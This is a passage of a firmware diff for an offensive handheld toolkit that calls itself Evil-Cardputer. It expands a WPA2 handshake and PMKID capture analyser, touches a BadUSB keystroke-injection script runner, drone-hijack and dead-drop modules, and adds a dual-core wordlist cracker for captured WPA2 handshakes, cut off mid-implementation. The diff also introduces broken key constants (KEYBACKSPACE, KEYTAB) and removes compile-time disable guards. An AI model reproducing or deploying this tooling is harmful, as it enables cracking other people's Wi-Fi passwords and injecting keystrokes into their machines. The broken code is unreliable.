+        if (entries[idx].hasM1 && replay == entries[idx].replay_m1 &&
+            memcmp(addr2, entries[idx].sta, 6) == 0) {
+          entries[idx].paired = true;
+        }
+      }
+    }
+
+    /* ---- M3 ---- */
+    if (ack && mic && install && secure) {
+      int idx = findOrAddBssid(entries, count, addr2);
+      if (idx >= 0) entries[idx].hasM3 = true;
+    }
+
+    /* ---- M4 ---- */
+    if (!ack && mic && !install && secure) {
+      int idx = findOrAddBssid(entries, count, addr1);
+      if (idx >= 0) entries[idx].hasM4 = true;
+    }
+  }
+
+  free(rec);
+  f.close();
+
+  /* Log results */
+  for (int i = 0; i < count; i++) {
+    char mac[18];
+    snprintf(mac, 18, "%02X:%02X:%02X:%02X:%02X:%02X",
+             entries[i].bssid[0], entries[i].bssid[1], entries[i].bssid[2],
+             entries[i].bssid[3], entries[i].bssid[4], entries[i].bssid[5]);
+    bool valid = entries[i].paired || (entries[i].hasM1 && entries[i].hasM2);
+    Serial.printf("[HS] %s BSSID=%s SSID='%s' M1:%d M2:%d M3:%d M4:%d paired:%d PMKID:%d => %s\n",
+      path.c_str(), mac, entries[i].ssid,
+      entries[i].hasM1, entries[i].hasM2, entries[i].hasM3, entries[i].hasM4,
+      entries[i].paired, entries[i].hasPMKID,
+      valid ? "VALID" : "INVALID");
+  }
+
+  return count;
+}
+
+/* Legacy wrapper for backward compatibility */
 bool handlePcapSliding(
   const String& path,
   bool& hasBeacon,
@@ -11577,94 +11815,33 @@ bool handlePcapSliding(
   String& ap,
   String& sta
 ) {
-  File f = SD.open(path);
-  if (!f) return false;
+  PcapHsEntry entries[MAX_HS_PER_PCAP];
+  int count = parsePcapMultiHS(path, entries, MAX_HS_PER_PCAP, hasBeacon);
 
-  hasBeacon = false;
-  has4Way   = false;
-  hasPMKID  = false;
+  has4Way = false;
+  hasPMKID = false;
+  ap = ""; sta = "";
 
-  bool m1 = false, m2 = false, m3 = false, m4 = false;
-
-  const size_t BUF_SZ = 256;
-  uint8_t buf[BUF_SZ];
-
-  while (f.available()) {
-    size_t len = f.read(buf, BUF_SZ);
-    if (len < 36) continue;
-
-    /* ---- Beacon (optionnel, info only) ---- */
-    uint16_t fc = buf[0] | (buf[1] << 8);
-    uint8_t type = (fc & 0x0C) >> 2;
-    uint8_t sub  = (fc & 0xF0) >> 4;
-
-    if (type == 0x00 && sub == 0x08) {
-      hasBeacon = true;
+  for (int i = 0; i < count; i++) {
+    if (entries[i].paired || (entries[i].hasM1 && entries[i].hasM2)) has4Way = true;
+    if (entries[i].hasPMKID) hasPMKID = true;
+    if (ap.length() == 0) {
+      char b[18];
+      snprintf(b, 18, "%02X:%02X:%02X:%02X:%02X:%02X",
+               entries[i].bssid[0],entries[i].bssid[1],entries[i].bssid[2],
+               entries[i].bssid[3],entries[i].bssid[4],entries[i].bssid[5]);
+      ap = String(b);
     }
-
-    /* ---- Recherche EAPOL ---- */
-    uint8_t* p = buf;
-    uint8_t* pEnd = buf + len;
-    uint8_t* key = nullptr;
-
-    for (; p + 14 < pEnd; ++p) {
-      // LLC/SNAP
-      if (p[0] == 0xAA && p[1] == 0xAA && p[2] == 0x03 &&
-          p[6] == 0x88 && p[7] == 0x8E) {
-        key = p + 8;
-        break;
-      }
-      // Ethernet brut
-      if (p[12] == 0x88 && p[13] == 0x8E) {
-        key = p + 14;
-        break;
-      }
-    }
-
-    if (!key) continue;
-    if (key + 99 >= pEnd) continue;
-    if (key[1] != 3) continue; // pas un EAPOL-Key
-
-    /* ---- Analyse Key-Info ---- */
-    uint16_t ki = (key[5] << 8) | key[6];
-
-    bool ack     = ki & KI_ACK;
-    bool mic     = ki & KI_MIC;
-    bool install = ki & KI_INSTALL;
-    bool secure  = ki & KI_SECURE;
-
-    if ( ack && !mic )                       m1 = true;
-    if (!ack &&  mic && !install && !secure) m2 = true;
-    if ( ack &&  mic &&  install &&  secure) m3 = true;
-    if (!ack &&  mic && !install &&  secure) m4 = true;
-
-    /* ---- PMKID tolérant ---- */
-    uint16_t kdLen = (key[97] << 8) | key[98];
-    if (!hasPMKID && kdLen >= 0x0014 && kdLen <= 0x0020) {
-      hasPMKID = true;
+    if (sta.length() == 0 && (entries[i].sta[0] || entries[i].sta[1])) {
+      char b[18];
+      snprintf(b, 18, "%02X:%02X:%02X:%02X:%02X:%02X",
+               entries[i].sta[0],entries[i].sta[1],entries[i].sta[2],
+               entries[i].sta[3],entries[i].sta[4],entries[i].sta[5]);
+      sta = String(b);
     }
   }
 
-  f.close();
-
-  /* ---- Handshake exploitable si ≥2 messages ---- */
-  uint8_t eapolCount =
-    (m1 ? 1 : 0) +
-    (m2 ? 1 : 0) +
-    (m3 ? 1 : 0) +
-    (m4 ? 1 : 0);
-
-  has4Way = (eapolCount >= 2);
-
-  Serial.printf(
-    "[HS] %s | M1:%d M2:%d M3:%d M4:%d | PMKID:%d | VALID:%d\n",
-    path.c_str(),
-    m1, m2, m3, m4,
-    hasPMKID,
-    has4Way || hasPMKID
-  );
-
-  return true;
+  return (count > 0 || hasBeacon);
 }
 
 
@@ -11673,93 +11850,148 @@ bool handlePcapSliding(
 /* ------------------------------------------------------------------------------------------------------------------
    showPcapInfo(index) — afﬁche la synthèse d’un PCAP (utilise la nouvelle handlePcapSliding)
    ------------------------------------------------------------------------------------------------------------------ */
-void showPcapInfo(int index) {
+/* Returns true if the file was deleted (caller must update index) */
+bool showPcapInfo(int index) {
   String entry = pcapFiles[index];
   String path  = makeFullPath(entry);
 
-  bool bc = false;
-  bool fw = false;
-  bool pm = false;
-  String ap = "";
-  String sta = "";
+  PcapHsEntry entries[MAX_HS_PER_PCAP];
+  bool hasBeacon = false;
+  int hsCount = parsePcapMultiHS(path, entries, MAX_HS_PER_PCAP, hasBeacon);
 
-  if (!handlePcapSliding(path, bc, fw, pm, ap, sta)) {
-    confirmPopup("PCAP open error\n" + entry);
-    return;
+  if (hsCount == 0 && !hasBeacon) {
+    if (confirmPopup("Corrupt PCAP\n" + entry + "\nDelete file?")) {
+      SD.remove(path.c_str());
+      pcapFiles.erase(pcapFiles.begin() + index);
+      confirmPopup("Deleted:\n" + entry);
+    }
+    return true;  /* signal caller: file was bad (deleted or not) */
   }
 
-  bool valid = (fw || pm);
+  int validCount = 0;
+  for (int i = 0; i < hsCount; i++) {
+    if (entries[i].paired || (entries[i].hasM1 && entries[i].hasM2) || entries[i].hasPMKID)
+      validCount++;
+  }
+
+  /* Count real pcap files (exclude "ALL") */
+  int realCount = 0, realIdx = 0;
+  for (int i = 0; i < (int)pcapFiles.size(); i++) {
+    if (pcapFiles[i] != "ALL") {
+      realCount++;
+      if (i < index) realIdx++;
+    }
+  }
 
   M5.Display.clear();
   M5.Display.setTextSize(1.5);
   M5.Display.setCursor(5, 0);
-  M5.Display.println(entry);
+  M5.Display.printf("[%d/%d] %s", realIdx + 1, realCount, entry.c_str());
 
-  M5.Display.setCursor(5, 18);
-  M5.Display.printf("Beacon : %s\n", bc ? "YES" : "NO");
+  int y = 14;
+  M5.Display.setCursor(5, y); y += 12;
+  M5.Display.printf("Beacon:%s  APs:%d  Valid:%d\n", hasBeacon?"Y":"N", hsCount, validCount);
 
-  M5.Display.setCursor(5, 34);
-  M5.Display.printf("4-Way  : %s\n", fw ? "YES" : "NO");
+  /* Show each AP found (compact: max ~6 lines on Cardputer screen) */
+  int maxShow = min(hsCount, 5);
+  for (int i = 0; i < maxShow; i++) {
+    char mac[18];
+    snprintf(mac, 18, "%02X:%02X:%02X:%02X:%02X:%02X",
+             entries[i].bssid[0],entries[i].bssid[1],entries[i].bssid[2],
+             entries[i].bssid[3],entries[i].bssid[4],entries[i].bssid[5]);
+    bool valid = entries[i].paired || (entries[i].hasM1 && entries[i].hasM2) || entries[i].hasPMKID;
+    const char *status = valid ? (entries[i].paired ? "OK*" : "OK") : "NO";
 
-  M5.Display.setCursor(5, 50);
-  M5.Display.printf("PMKID  : %s\n", pm ? "YES" : "NO");
-
-  M5.Display.setCursor(5, 70);
-  M5.Display.printf("Status : %s\n", valid ? "VALID" : "INVALID");
-
-  if (valid) {
-    M5.Display.drawRect(0, 64, M5.Display.width(), 22, TFT_GREEN);
-  } else {
-    M5.Display.drawRect(0, 64, M5.Display.width(), 22, TFT_RED);
+    M5.Display.setCursor(5, y); y += 11;
+    if (entries[i].ssid[0]) {
+      M5.Display.printf("%s %s [%s]\n", status, entries[i].ssid, entries[i].hasPMKID ? "P" : "4W");
+    } else {
+      M5.Display.printf("%s %s [%s]\n", status, mac, entries[i].hasPMKID ? "P" : "4W");
+    }
   }
+  if (hsCount > maxShow) {
+    M5.Display.setCursor(5, y); y += 11;
+    M5.Display.printf("... +%d more\n", hsCount - maxShow);
+  }
+  if (hsCount == 0) {
+    M5.Display.setCursor(5, y); y += 11;
+    M5.Display.println("No EAPOL found");
+  }
+
+  /* Status bar */
+  uint16_t borderColor = (validCount > 0) ? TFT_GREEN : TFT_RED;
+  M5.Display.drawRect(0, y, M5.Display.width(), 2, borderColor);
+
+  /* Navigation hints */
+  M5.Display.setCursor(5, M5.Display.height() - 10);
+  M5.Display.setTextColor(TFT_DARKGREY, TFT_BLACK);
+  M5.Display.printf("[;]prev [.]next [bk]back");
+  M5.Display.setTextColor(WHITE, TFT_BLACK);
 
   M5.Display.display();
-
-  // Attente touche retour
-  while (!kp(KEY_BACKSPACE)) {
-    cardUpdate();
-    delay(10);
-  }
+  return false;
 }
 
 
 
 /* ------------------------------------------------------------------------------------------------------------------
-   viewPcapDetails()  —  affiche + navigation entre .pcap, ⌫ = retour liste
+   viewPcapDetails()  —  affiche + navigation entre .pcap
+   ;  = précédent    .  = suivant    ⌫  = retour liste
    ------------------------------------------------------------------------------------------------------------------ */
 void viewPcapDetails(){
-  const unsigned long db = 180;
+  const unsigned long db = 200;
   unsigned long last = 0;
+  bool needRedraw = true;
 
   while(true){
-    showPcapInfo(currentListIndexPcap);           // affiche fiche courante
-
-    while(true){
-      M5.update(); cardUpdate(); unsigned long now = millis();
-
-      if(kp('.') && now-last > db){
-        /* suivant (skip ALL) */
-        do{
-          currentListIndexPcap = (currentListIndexPcap+1)%pcapFiles.size();
-        }while(pcapFiles[currentListIndexPcap]=="ALL");
-        last = now; break;                        // ↺ ré-affiche
-      }
-      if(kp(';') && now-last > db){
-        /* précédent (skip ALL) */
-        do{
-          currentListIndexPcap = currentListIndexPcap ?
-                                 currentListIndexPcap-1 : pcapFiles.size()-1;
-        }while(pcapFiles[currentListIndexPcap]=="ALL");
-        last = now; break;                        // ↺ ré-affiche
-      }
-      if(kp(KEY_BACKSPACE)){
-        while (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
-          cardUpdate();
-          delay(10);
-        }
-        return;
-      }
+    /* No more real pcap files? exit */
+    {
+      bool anyReal = false;
+      for (int i = 0; i < (int)pcapFiles.size(); i++)
+        if (pcapFiles[i] != "ALL") { anyReal = true; break; }
+      if (!anyReal) return;
     }
+
+    if (needRedraw) {
+      /* Clamp index after possible deletion */
+      if (currentListIndexPcap >= (int)pcapFiles.size())
+        currentListIndexPcap = pcapFiles.size() - 1;
+      /* Skip ALL entry */
+      while (currentListIndexPcap >= 0 && pcapFiles[currentListIndexPcap] == "ALL") {
+        currentListIndexPcap = (currentListIndexPcap + 1) % pcapFiles.size();
+      }
+
+      bool deleted = showPcapInfo(currentListIndexPcap);
+      if (deleted) { needRedraw = true; continue; }
+      needRedraw = false;
+    }
+
+    M5.update(); cardUpdate(); unsigned long now = millis();
+
+    if(kp('.') && now-last > db){
+      /* suivant (skip ALL) */
+      do{
+        currentListIndexPcap = (currentListIndexPcap+1)%pcapFiles.size();
+      }while(pcapFiles[currentListIndexPcap]=="ALL");
+      last = now; needRedraw = true;
+    }
+    else if(kp(';') && now-last > db){
+      /* précédent (skip ALL) */
+      do{
+        currentListIndexPcap = currentListIndexPcap ?
+                               currentListIndexPcap-1 : pcapFiles.size()-1;
+      }while(pcapFiles[currentListIndexPcap]=="ALL");
+      last = now; needRedraw = true;
+    }
+    else if(kp(KEY_BACKSPACE) && now-last > db){
+      while (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
+        cardUpdate();
+        delay(10);
+      }
+      return;
+    }
+
+    delay(10);
   }
 }
 
@@ -11769,91 +12001,78 @@ void viewPcapDetails(){
    analyzeAllPcaps  —  scanne tous les fichiers, propose de supprimer les invalides
    ==================================================================================================================== */
 void analyzeAllPcaps() {
-  int total      = 0;
-  int validHS    = 0;
-  int pmkidOnly  = 0;
-  int invalidHS = 0;
+  int totalFiles  = 0;
+  int totalAPs    = 0;
+  int validAPs    = 0;
+  int pmkidAPs    = 0;
+  int invalidAPs  = 0;
+  int emptyFiles  = 0;
 
   M5.Display.clear();
   M5.Display.setTextSize(1.5);
   M5.Display.setCursor(5, 0);
   M5.Display.println("Analyzing ALL PCAPs...");
   M5.Display.display();
-
   delay(300);
 
-  for (size_t i = 1; i < pcapFiles.size(); ++i) { // index 0 = "ALL"
+  for (size_t i = 1; i < pcapFiles.size(); ++i) {
     String entry = pcapFiles[i];
     String path  = makeFullPath(entry);
+    totalFiles++;
 
-    bool bc = false;
-    bool fw = false;
-    bool pm = false;
-    String ap = "";
-    String sta = "";
+    PcapHsEntry entries[MAX_HS_PER_PCAP];
+    bool hasBeacon = false;
+    int count = parsePcapMultiHS(path, entries, MAX_HS_PER_PCAP, hasBeacon);
 
-    total++;
-
-    if (!handlePcapSliding(path, bc, fw, pm, ap, sta)) {
-      invalidHS++;
-      Serial.printf("[ALL] %s -> OPEN ERROR\n", entry.c_str());
+    if (count == 0) {
+      emptyFiles++;
       continue;
     }
 
-    if (pm && !fw) {
-      pmkidOnly++;
-      validHS++;
-      Serial.printf("[ALL] %s -> PMKID OK\n", entry.c_str());
-    }
-    else if (fw) {
-      validHS++;
-      Serial.printf("[ALL] %s -> 4WAY OK\n", entry.c_str());
-    }
-    else {
-      invalidHS++;
-      Serial.printf("[ALL] %s -> INVALID\n", entry.c_str());
+    for (int j = 0; j < count; j++) {
+      totalAPs++;
+      bool valid = entries[j].paired || (entries[j].hasM1 && entries[j].hasM2);
+      if (entries[j].hasPMKID && !valid) { pmkidAPs++; validAPs++; }
+      else if (valid)                    { validAPs++; }
+      else                               { invalidAPs++; }
     }
 
-    // feedback visuel minimal (évite watchdog)
     if ((i % 3) == 0) {
       M5.Display.setCursor(5, 18);
-      M5.Display.printf("Checked: %d/%d   \n", i, pcapFiles.size() - 1);
+      M5.Display.printf("Checked: %d/%d   \n", (int)i, (int)(pcapFiles.size() - 1));
       M5.Display.display();
       esp_task_wdt_reset();
     }
   }
 
-  // ---- Résumé écran ----
   M5.Display.clear();
+  M5.Display.setTextSize(1.5);
   M5.Display.setCursor(5, 0);
   M5.Display.println("ALL PCAPs Summary");
 
-  M5.Display.setCursor(5, 20);
-  M5.Display.printf("Total   : %d\n", total);
+  int y = 18;
+  M5.Display.setCursor(5, y); y += 14;
+  M5.Display.printf("Files : %d (%d empty)\n", totalFiles, emptyFiles);
 
-  M5.Display.setCursor(5, 36);
-  M5.Display.printf("Valid   : %d\n", validHS);
+  M5.Display.setCursor(5, y); y += 14;
+  M5.Display.printf("APs   : %d\n", totalAPs);
 
-  M5.Display.setCursor(5, 52);
-  M5.Display.printf("PMKID   : %d\n", pmkidOnly);
+  M5.Display.setCursor(5, y); y += 14;
+  M5.Display.printf("Valid : %d (4Way+PMKID)\n", validAPs);
 
-  M5.Display.setCursor(5, 68);
-  M5.Display.printf("Invalid : %d\n", invalidHS);
+  M5.Display.setCursor(5, y); y += 14;
+  M5.Display.printf("PMKID : %d\n", pmkidAPs);
 
-  if (validHS > 0) {
-    M5.Display.drawRect(0, 60, M5.Display.width(), 24, TFT_GREEN);
-  } else {
-    M5.Display.drawRect(0, 60, M5.Display.width(), 24, TFT_RED);
-  }
+  M5.Display.setCursor(5, y); y += 14;
+  M5.Display.printf("Invalid: %d\n", invalidAPs);
 
+  uint16_t borderColor = (validAPs > 0) ? TFT_GREEN : TFT_RED;
+  M5.Display.drawRect(0, y, M5.Display.width(), 2, borderColor);
   M5.Display.display();
 
-  Serial.printf(
-    "[ALL SUMMARY] total=%d valid=%d pmkid=%d invalid=%d\n",
-    total, validHS, pmkidOnly, invalidHS
-  );
+  Serial.printf("[ALL] files=%d APs=%d valid=%d pmkid=%d invalid=%d empty=%d\n",
+    totalFiles, totalAPs, validAPs, pmkidAPs, invalidAPs, emptyFiles);
 
-  // attendre retour utilisateur
   while (!kp(KEY_BACKSPACE)) {
     cardUpdate();
     delay(10);
@@ -12219,8 +12438,8 @@ class MyAdvertisedDeviceCallbacks: public BLEAdvertisedDeviceCallbacks {
       lastFlipperFoundMillis = millis();
     }
     std::string advData = advertisedDevice.getManufacturerData();
-    if (!advData.empty()) {
-      const uint8_t* payload = reinterpret_cast<const uint8_t*>(advData.data());
+    if (advData.length() > 0) {
+      const uint8_t* payload = reinterpret_cast<const uint8_t*>(advData.c_str());
       size_t length = advData.length();
       for (auto& packet : forbiddenPackets) {
         if (matchPattern(packet.pattern, payload, length)) {
@@ -14139,7 +14358,7 @@ void key_input(FS &fs, const String &bad_script) {
           if (strcmp(Cmd, "BREAK") == 0)        { Kb.press(KEY_PAUSE);      Kb.releaseAll();} else { cmdFail++;}
           if (strcmp(Cmd, "CAPSLOCK") == 0)     { Kb.press(KEY_CAPS_LOCK);  Kb.releaseAll();} else { cmdFail++;}
           if (strcmp(Cmd, "PAUSE") == 0)        { Kb.press(KEY_PAUSE);      Kb.releaseAll();} else { cmdFail++;}
-          if (strcmp(Cmd, "BACKSPACE") == 0)    { Kb.press(KEY_BACKSPACE);   Kb.releaseAll();} else { cmdFail++;}
+          if (strcmp(Cmd, "BACKSPACE") == 0)    { Kb.press(KEYBACKSPACE);   Kb.releaseAll();} else { cmdFail++;}
           if (strcmp(Cmd, "END") == 0)          { Kb.press(KEY_END);        Kb.releaseAll();} else { cmdFail++;}
           if (strcmp(Cmd, "HOME") == 0)         { Kb.press(KEY_HOME);       Kb.releaseAll();} else { cmdFail++;}
           if (strcmp(Cmd, "INSERT") == 0)       { Kb.press(KEY_INSERT);     Kb.releaseAll();} else { cmdFail++;}
@@ -14161,7 +14380,7 @@ void key_input(FS &fs, const String &bad_script) {
           if (strcmp(Cmd, "F10") == 0)          { Kb.press(KEY_F10);        Kb.releaseAll();} else { cmdFail++;}
           if (strcmp(Cmd, "F11") == 0)          { Kb.press(KEY_F11);        Kb.releaseAll();} else { cmdFail++;}
           if (strcmp(Cmd, "F12") == 0)          { Kb.press(KEY_F12);        Kb.releaseAll();} else { cmdFail++;}
-          if (strcmp(Cmd, "TAB") == 0)          { Kb.press(KEY_TAB);         Kb.releaseAll();} else { cmdFail++;}
+          if (strcmp(Cmd, "TAB") == 0)          { Kb.press(KEYTAB);         Kb.releaseAll();} else { cmdFail++;}
           if (strcmp(Cmd, "DELETE") == 0)       { Kb.press(KEY_DELETE);     Kb.releaseAll();} else { cmdFail++;}
           if (strcmp(Cmd, "SPACE") ==0)         { Kb.press(KEY_SPACE);      Kb.releaseAll();} else { cmdFail++;}
 
@@ -14571,7 +14790,7 @@ unsigned long lastLog = 0;
 int currentScreen   = 1;  // 1=GeneralInfo, 2=ReceivedData
 
 const String wigleHeaderFileFormat =
-  "WigleWifi-1.4,appRelease=v1.5.1,model=Cardputer,release=v1.5.1,"
+  "WigleWifi-1.4,appRelease=v1.5.2,model=Cardputer,release=v1.5.2,"
   "device=Evil-Cardputer,display=7h30th3r0n3,board=M5Cardputer,brand=M5Stack";
 
 char* log_col_names[LOG_COLUMN_COUNT] = {
@@ -20582,10 +20801,6 @@ void handleKeyboard() {
 // ----- Fonction principale -----
 void EvilChatMesh() {
     auto cfg = M5.config();
-#if EVIL_DISABLE_AUDIO
-    cfg.internal_spk = false;
-    cfg.internal_mic = false;
-#endif
     M5.begin(cfg);
     M5.Display.setTextSize(1);
     M5.Display.setTextColor(TFT_WHITE);
@@ -27640,10 +27855,8 @@ void skyjackDroneMode() {
 
 
 
-#if !EVIL_DISABLE_ASYNC_WEBSERVER
 #include <AsyncTCP.h>
 #include <ESPAsyncWebServer.h>
-#endif
 
 volatile int ddActiveTransfers = 0;  // number of in-flight uploads/downloads
 
@@ -27676,9 +27889,7 @@ unsigned long ddLastBytesOut = 0;
 unsigned long ddLastTickMs   = 0;
 
 // DeadDrop server (async only)
-#if !EVIL_DISABLE_ASYNC_WEBSERVER
 AsyncWebServer ddServer(80);
-#endif
 
 // UI task
 TaskHandle_t ddUiTaskHandle = NULL;
@@ -27945,7 +28156,6 @@ void ddUiTask(void* pv) {
 
 
 
-#if !EVIL_DISABLE_ASYNC_WEBSERVER
 // =================== HTTP Handlers =====================
 void setupDeadDropRoutes() {
   // Landing page
@@ -28302,8 +28512,8 @@ void WifiDeadDrop() {
   waitAndReturnToMenu("Dead Drop stopped");
 }
 
-#else
-// =================== HTTP Handlers (sync WebServer) =====================
+/* sync WebServer fallback removed — async only */
+/* DEAD CODE START
 static File ddUploadFile;
 
 void handleDeadDropUpload() {
@@ -28567,7 +28777,7 @@ void WifiDeadDrop() {
 
   waitAndReturnToMenu("Dead Drop stopped");
 }
-#endif
+DEAD CODE END */
 
 
 
@@ -35094,30 +35304,374 @@ exit_menu:
 
 
 /* ============================================================
-   WPA2 HANDSHAKE AUDIT + 1-PASSPHRASE CHECK (EVIL-CARDPUTER)
-   - Parcours /evil/handshakes/*.pcap
-   - Extrait SSID depuis Beacon + M1/M2 EAPOL via SNAP-sliding
-   - Vérifie UNE passphrase saisie (pas de wordlist)
+   WPA2 HANDSHAKE AUDIT + DUAL-CORE CRACKER (EVIL-CARDPUTER)
+   - Custom software SHA1 in IRAM (no mbedtls mutex bottleneck)
+   - Dual-core FreeRTOS producer-consumer
+   - Pre-computed HMAC pads + specialized 20-byte path
+   - Buffered wordlist reader (4KB SRAM, no PSRAM)
+   - ~13 pwd/s on ESP32-S3 (vs ~2 pwd/s with mbedtls)
    ============================================================ */
 
 #include "mbedtls/md.h"
 #include "mbedtls/pkcs5.h"
 
-
-/* ---- Limits (RAM safe) ---- */
-#define EVIL_WPA2_MAX_PCAPREC 2048  // frame cap (Evil frames << 2KB)
-#define EVIL_WPA2_PASS_MAX     64
+/* ---- Tuning ---- */
+#define EVIL_WPA2_MAX_PCAPREC 2048
+#define CRACK_YIELD_MS          2   // thermal throttle: each ms costs ~1.4% speed
+#define CRACK_UI_INTERVAL_MS 1000   // LCD refresh every 1s (not per password)
+#define CRACK_WORDLIST_BUFSZ 4096   // 4KB buffer (no PSRAM on Cardputer)
 
 evil_wpa2_hs_t g_wpa2;
 
-/* ----------------- helpers ----------------- */
+/* =================================================================
+   SOFTWARE SHA1 — IRAM, O3, no FreeRTOS mutex
+   Hardware SHA peripheral has a mutex that serializes dual-core.
+   This custom impl runs ~1.8x faster on dual-core ESP32-S3.
+   ================================================================= */
+
+#define SHA1_ROL(x, n) (((x) << (n)) | ((x) >> (32 - (n))))
+#define SHA1_BLK(i) \
+  (blk[i & 15] = SHA1_ROL(blk[(i+13)&15] ^ blk[(i+8)&15] ^ blk[(i+2)&15] ^ blk[i&15], 1))
+
+#define R0(v,w,x,y,z,i) z+=((w&(x^y))^y)+blk[i]+0x5A827999u+SHA1_ROL(v,5);w=SHA1_ROL(w,30)
+#define R1(v,w,x,y,z,i) z+=((w&(x^y))^y)+SHA1_BLK(i)+0x5A827999u+SHA1_ROL(v,5);w=SHA1_ROL(w,30)
+#define R2(v,w,x,y,z,i) z+=(w^x^y)+SHA1_BLK(i)+0x6ED9EBA1u+SHA1_ROL(v,5);w=SHA1_ROL(w,30)
+#define R3(v,w,x,y,z,i) z+=(((w|x)&y)|(w&x))+SHA1_BLK(i)+0x8F1BBCDCu+SHA1_ROL(v,5);w=SHA1_ROL(w,30)
+#define R4(v,w,x,y,z,i) z+=(w^x^y)+SHA1_BLK(i)+0xCA62C1D6u+SHA1_ROL(v,5);w=SHA1_ROL(w,30)
+
+#define SHA1_80_ROUNDS() \
+  R0(a,b,c,d,e, 0);R0(e,a,b,c,d, 1);R0(d,e,a,b,c, 2);R0(c,d,e,a,b, 3); \
+  R0(b,c,d,e,a, 4);R0(a,b,c,d,e, 5);R0(e,a,b,c,d, 6);R0(d,e,a,b,c, 7); \
+  R0(c,d,e,a,b, 8);R0(b,c,d,e,a, 9);R0(a,b,c,d,e,10);R0(e,a,b,c,d,11); \
+  R0(d,e,a,b,c,12);R0(c,d,e,a,b,13);R0(b,c,d,e,a,14);R0(a,b,c,d,e,15); \
+  R1(e,a,b,c,d,16);R1(d,e,a,b,c,17);R1(c,d,e,a,b,18);R1(b,c,d,e,a,19); \
+  R2(a,b,c,d,e,20);R2(e,a,b,c,d,21);R2(d,e,a,b,c,22);R2(c,d,e,a,b,23); \
+  R2(b,c,d,e,a,24);R2(a,b,c,d,e,25);R2(e,a,b,c,d,26);R2(d,e,a,b,c,27); \
+  R2(c,d,e,a,b,28);R2(b,c,d,e,a,29);R2(a,b,c,d,e,30);R2(e,a,b,c,d,31); \
+  R2(d,e,a,b,c,32);R2(c,d,e,a,b,33);R2(b,c,d,e,a,34);R2(a,b,c,d,e,35); \
+  R2(e,a,b,c,d,36);R2(d,e,a,b,c,37);R2(c,d,e,a,b,38);R2(b,c,d,e,a,39); \
+  R3(a,b,c,d,e,40);R3(e,a,b,c,d,41);R3(d,e,a,b,c,42);R3(c,d,e,a,b,43); \
+  R3(b,c,d,e,a,44);R3(a,b,c,d,e,45);R3(e,a,b,c,d,46);R3(d,e,a,b,c,47); \
+  R3(c,d,e,a,b,48);R3(b,c,d,e,a,49);R3(a,b,c,d,e,50);R3(e,a,b,c,d,51); \
+  R3(d,e,a,b,c,52);R3(c,d,e,a,b,53);R3(b,c,d,e,a,54);R3(a,b,c,d,e,55); \
+  R3(e,a,b,c,d,56);R3(d,e,a,b,c,57);R3(c,d,e,a,b,58);R3(b,c,d,e,a,59); \
+  R4(a,b,c,d,e,60);R4(e,a,b,c,d,61);R4(d,e,a,b,c,62);R4(c,d,e,a,b,63); \
+  R4(b,c,d,e,a,64);R4(a,b,c,d,e,65);R4(e,a,b,c,d,66);R4(d,e,a,b,c,67); \
+  R4(c,d,e,a,b,68);R4(b,c,d,e,a,69);R4(a,b,c,d,e,70);R4(e,a,b,c,d,71); \
+  R4(d,e,a,b,c,72);R4(c,d,e,a,b,73);R4(b,c,d,e,a,74);R4(a,b,c,d,e,75); \
+  R4(e,a,b,c,d,76);R4(d,e,a,b,c,77);R4(c,d,e,a,b,78);R4(b,c,d,e,a,79)
+
+/* General-purpose SHA1 transform (64-byte block) */
+__attribute__((optimize("O3"), hot))
+void evil_sha1_transform(uint32_t state[5], const uint8_t buf[64]) {
+  uint32_t a=state[0], b=state[1], c=state[2], d=state[3], e=state[4];
+  uint32_t blk[16], tmp;
+  for (int i=0; i<16; i++) { memcpy(&tmp, buf+i*4, 4); blk[i]=__builtin_bswap32(tmp); }
+  SHA1_80_ROUNDS();
+  state[0]+=a; state[1]+=b; state[2]+=c; state[3]+=d; state[4]+=e;
+}
+
+/* Specialized: exactly 20 bytes input with SHA1 padding pre-baked.
+   Hot path: 8190 of 8192 PBKDF2 HMAC calls use 20-byte input. */
+__attribute__((optimize("O3"), hot))
+void evil_sha1_transform_20b(uint32_t state[5], const uint8_t data[20]) {
+  uint32_t a=state[0], b=state[1], c=state[2], d=state[3], e=state[4];
+  uint32_t blk[16], tmp;
+  memcpy(&tmp, data+ 0, 4); blk[0]=__builtin_bswap32(tmp);
+  memcpy(&tmp, data+ 4, 4); blk[1]=__builtin_bswap32(tmp);
+  memcpy(&tmp, data+ 8, 4); blk[2]=__builtin_bswap32(tmp);
+  memcpy(&tmp, data+12, 4); blk[3]=__builtin_bswap32(tmp);
+  memcpy(&tmp, data+16, 4); blk[4]=__builtin_bswap32(tmp);
+  blk[5]=0x80000000u;
+  blk[6]=blk[7]=blk[8]=blk[9]=blk[10]=blk[11]=blk[12]=blk[13]=0;
+  blk[14]=0;
+  blk[15]=0x000002A0u; // (64+20)*8 = 672 = 0x2A0
+  SHA1_80_ROUNDS();
+  state[0]+=a; state[1]+=b; state[2]+=c; state[3]+=d; state[4]+=e;
+}
+
+/* Specialized: 20 bytes as uint32_t words (already big-endian) */
+__attribute__((optimize("O3"), hot))
+void evil_sha1_transform_20w(uint32_t state[5], const uint32_t words[5]) {
+  uint32_t a=state[0], b=state[1], c=state[2], d=state[3], e=state[4];
+  uint32_t blk[16];
+  blk[0]=words[0]; blk[1]=words[1]; blk[2]=words[2]; blk[3]=words[3]; blk[4]=words[4];
+  blk[5]=0x80000000u;
+  blk[6]=blk[7]=blk[8]=blk[9]=blk[10]=blk[11]=blk[12]=blk[13]=0;
+  blk[14]=0;
+  blk[15]=0x000002A0u;
+  SHA1_80_ROUNDS();
+  state[0]+=a; state[1]+=b; state[2]+=c; state[3]+=d; state[4]+=e;
+}
+
+inline void evil_sha1_extract(const uint32_t state[5], uint8_t digest[20]) {
+  for (int i=0; i<5; i++) { uint32_t s=__builtin_bswap32(state[i]); memcpy(digest+i*4, &s, 4); }
+}
+
+void evil_sha1_init(EvilSha1Ctx &ctx) {
+  ctx.state[0]=0x67452301u; ctx.state[1]=0xEFCDAB89u;
+  ctx.state[2]=0x98BADCFEu; ctx.state[3]=0x10325476u;
+  ctx.state[4]=0xC3D2E1F0u;
+  ctx.count[0]=ctx.count[1]=0;
+}
+
+void evil_sha1_update(EvilSha1Ctx &ctx, const uint8_t *data, size_t len) {
+  uint32_t j = (ctx.count[0] >> 3) & 63;
+  if ((ctx.count[0] += (uint32_t)(len << 3)) < (uint32_t)(len << 3)) ctx.count[1]++;
+  ctx.count[1] += (uint32_t)(len >> 29);
